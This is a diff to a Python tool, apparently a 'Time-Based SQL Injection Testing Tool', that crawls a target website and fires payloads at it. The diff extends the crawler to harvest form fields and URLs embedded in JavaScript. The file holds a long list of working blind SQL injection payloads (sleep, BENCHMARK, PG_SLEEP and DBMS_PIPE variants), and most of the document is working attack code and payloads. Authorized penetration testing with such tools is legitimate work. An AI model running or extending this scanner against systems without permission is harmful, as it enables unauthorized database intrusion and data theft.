@@ -1,20 +1,21 @@
 import requests
 import argparse
 import time
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 from bs4 import BeautifulSoup
 import threading
 import sqlite3
 import csv
 import json
 import os
+import re
 
 # Time-based XOR payloads provided
 TIME_BASED_XOR_PAYLOADS = [
     "0'XOR(if(now()=sysdate(),sleep(10),0))XOR'X",
     "0\"XOR(if(now()=sysdate(),sleep(10),0))XOR\"Z",
-    "‘ AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND ‘mSUA’=’mSUA",
-    "'XOR(if((select now()=sysdate()),sleep(10),0))XOR'Z",
+    "' AND (SELECT 8839 FROM (SELECT(SLEEP(5)))uzIY) AND 'mSUA'='mSUA",
+    "'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z",
     "X'XOR(if(now()=sysdate(),/**/sleep(5)/**/,0))XOR'X",
     "X'XOR(if(now()=sysdate(),(sleep((((5))))),0))XOR'X",
     "X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X",
@@ -29,8 +30,8 @@ TIME_BASED_XOR_PAYLOADS = [
     "';(SELECT 4564 FROM PG_SLEEP(5))--",
     "[')//OR//MID(0x352e362e33332d6c6f67,1,1)//LIKE//5//%23']",
     "DBMS_PIPE.RECEIVE_MESSAGE(%5BINT%5D,5)%20AND%20'bar'='bar",
-    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
-    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
+    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
+    "1' AND (SELECT 6268 FROM (SELECT(SLEEP(5)))ghXo) AND 'IKlK'='IKlK",
     "(select*from(select(sleep(20)))a)",
     "'%2b(select*from(select(sleep(0)))a)%2b'",
     "*'XOR(if(2=2,sleep(10),0))OR'",
@@ -52,10 +53,10 @@ TIME_BASED_XOR_PAYLOADS = [
     "SLEEP(5)/*' or SLEEP(5) or '\" or SLEEP(5) or \"*/",
     "XOR(if(1337=1337,sleep(5),0))OR\"",
     "0%27XOR(if(now()=sysdate(),sleep(9),0))XOR%27Z",
-    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
+    "AND 5851=DBMS_PIPE.RECEIVE_MESSAGE([INT],5) AND 'bar'='bar",
     "(select(0)from(select(sleep(5)))v)%2f",
     "'(select(0)from(select(sleep(5)))v)",
-    "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'",
+    "'+\"+(select(0)from(select(sleep(5)))v)+\"*/'"
 ]
 
 class TimeBasedSQLiTester:
@@ -96,58 +97,99 @@ class TimeBasedSQLiTester:
         try:
             r = requests.get(base_url, headers={'User-Agent': self.config.user_agent}, timeout=self.config.timeout)
             soup = BeautifulSoup(r.text, 'html.parser')
-            for link in soup.find_all('a', href=True):
+
+            # Find all links
+            for link in soup.find_all(['a', 'link'], href=True):
                 href = link['href']
                 full_url = urljoin(base_url, href)
                 parsed_url = urlparse(full_url)
                 if base_url in full_url and full_url not in urls:
                     urls.add(full_url)
+
+            # Find all forms and extract action URLs
+            for form in soup.find_all('form'):
+                action = form.get('action')
+                form_url = urljoin(base_url, action)
+                if base_url in form_url and form_url not in urls:
+                    urls.add(form_url)
+
+                # Extract form parameters
+                inputs = form.find_all('input')
+                params = {}
+                for inp in inputs:
+                    name = inp.get('name')
+                    value = inp.get('value', '')
+                    if name:
+                        params[name] = value
+                if params:
+                    urls.add(self.add_params_to_url(form_url, params))
+
+            # Extract parameters from JavaScript
+            script_tags = soup.find_all('script')
+            for script in script_tags:
+                js_code = script.string
+                if js_code:
+                    urls.update(self.extract_js_urls(js_code, base_url))
+
         except requests.exceptions.RequestException as e:
             print(f"Failed to crawl {base_url}: {e}")
         return list(urls)
 
+    def extract_js_urls(self, js_code, base_url):
+        # Regex to find URLs in JavaScript
+        js_urls = set()
+        url_patterns = re.findall(r"""(https?://[^\s'"]+|[^\s'"]+/\w+\.php\?\w+=\w+)""", js_code)
+        for pattern in url_patterns:
+            full_url = urljoin(base_url, pattern)
+            if base_url in full_url:
+                js_urls.add(full_url)
+        return js_urls
+
+    def add_params_to_url(self, url, params):
+        url_parts = list(urlparse(url))
+        query = dict(parse_qs(url_parts[4]))
+        query.update(params)
+        url_parts[4] = '&'.join([f"{key}={value}" for key, value in query.items()])
+        return urljoin(url, url_parts[2] + '?' + url_parts[4])
+
     def display_results(self):
-        print(f"\n{len(self.results)} URLs found.")
         for result in self.results:
-            color = '\033[91m' if result['vulnerable'] else '\033[92m'
-            print(f"{color}{result['url']} - Vulnerable: {result['vulnerable']} - "
-                  f"Response Time: {result['response_time']:.2f}s - Status: {result['status_code']} - "
-                  f"Content Length: {result['content_length']}")
+            status = "Vulnerable" if result['vulnerable'] else "Not Vulnerable"
+            print(f"URL: {result['url']} | Payload: {result['payload']} | Status: {status} | Response Time: {result['response_time']}s | Status Code: {result['status_code']} | Content Length: {result['content_length']}")
 
         if self.config.generate_csv:
-            with open('time_based_sqli_results.csv', 'w', newline='') as csvfile:
-                fieldnames = ['url', 'payload', 'vulnerable', 'response_time', 'status_code', 'content_length']
-                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
-                writer.writeheader()
-                writer.writerows(self.results)
-            print("Results saved to time_based_sqli_results.csv")
-
+            self.generate_csv_report()
         if self.config.generate_json:
-            with open('time_based_sqli_results.json', 'w') as jsonfile:
-                json.dump(self.results, jsonfile, indent=4)
-            print("Results saved to time_based_sqli_results.json")
-
+            self.generate_json_report()
         if self.config.generate_html:
-            html_content = self.generate_html_report()
-            with open('time_based_sqli_results.html', 'w') as htmlfile:
-                htmlfile.write(html_content)
-            print("Results saved to time_based_sqli_results.html")
+            self.generate_html_report()
+
+    def generate_csv_report(self):
+        csv_file = 'sqli_results.csv'
+        with open(csv_file, mode='w', newline='') as file:
+            writer = csv.DictWriter(file, fieldnames=self.results[0].keys())
+            writer.writeheader()
+            for result in self.results:
+                writer.writerow(result)
+        print(f"CSV report generated: {csv_file}")
+
+    def generate_json_report(self):
+        json_file = 'sqli_results.json'
+        with open(json_file, 'w') as file:
+            json.dump(self.results, file, indent=4)
+        print(f"JSON report generated: {json_file}")
 
     def generate_html_report(self):
-        report = """
-        <html>
-        <head><title>Time-Based SQL Injection Test Report</title></head>
-        <body>
-        <h1>Time-Based SQL Injection Test Report</h1>
-        <table border="1">
-        <tr><th>URL</th><th>Payload</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>
-        """
-        for result in self.results:
-            color = 'red' if result['vulnerable'] else 'green'
-            report += f"<tr style='color:{color}'><td>{result['url']}</td><td>{result['payload']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>"
-        report += "</table></body></html>"
-        return report
-
+        html_file = 'sqli_results.html'
+        with open(html_file, 'w') as file:
+            file.write("<html><head><title>SQLi Test Results</title></head><body>")
+            file.write("<h1>SQL Injection Test Results</h1>")
+            file.write("<table border='1'><tr><th>URL</th><th>Payload</th><th>Vulnerable</th><th>Response Time (s)</th><th>Status Code</th><th>Content Length</th></tr>")
+            for result in self.results:
+                color = 'red' if result['vulnerable'] else 'green'
+                file.write(f"<tr style='color:{color}'><td>{result['url']}</td><td>{result['payload']}</td><td>{result['vulnerable']}</td><td>{result['response_time']:.2f}</td><td>{result['status_code']}</td><td>{result['content_length']}</td></tr>")
+            file.write("</table></body></html>")
+        print(f"HTML report generated: {html_file}")
 
 class Config:
     def __init__(self, args):
@@ -164,7 +206,7 @@ class Config:
         self.generate_html = args.generate_html
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Time-Based SQL Injection Testing Tool")
+    parser = argparse.ArgumentParser(description="Advanced Time-Based SQL Injection Testing Tool")
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("-t", "--sleep-time", type=int, default=5, help="Time to sleep for detection (in seconds)")
     parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay between requests (in seconds)")
